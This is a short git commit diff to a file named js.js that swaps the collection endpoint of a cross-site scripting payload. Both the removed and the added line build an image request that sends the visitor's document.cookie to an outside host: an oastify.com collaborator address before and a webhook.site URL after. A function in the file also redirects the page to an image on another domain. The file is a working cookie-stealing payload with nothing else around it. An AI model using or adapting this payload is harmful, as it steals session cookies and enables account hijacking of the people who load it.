92104b416fce007ff26b196d17e26fe857d70c33
Hideus <117414789+HideusXakep@users.noreply.github.com>
2026-04-10 21:21:58 +0200

    Update js.js

--- js.js
+++ js.js
@@ -1,6 +1,6 @@
 <script>
 img=new Image();
-img.src='https://jk7lgnbfxn90wisgl807r46bm2stgl4a.oastify.com/?cookie='+document.cookie;
+img.src='https://webhook.site/08a56948-1ef2-40fe-a358-f78144c4339f?cookie='+document.cookie;
 function F() {
     location='https://otvet.imgsmail.ru/download/234054366_4f953678a2475e9c53a807f249174753_800.jpg ';
 }
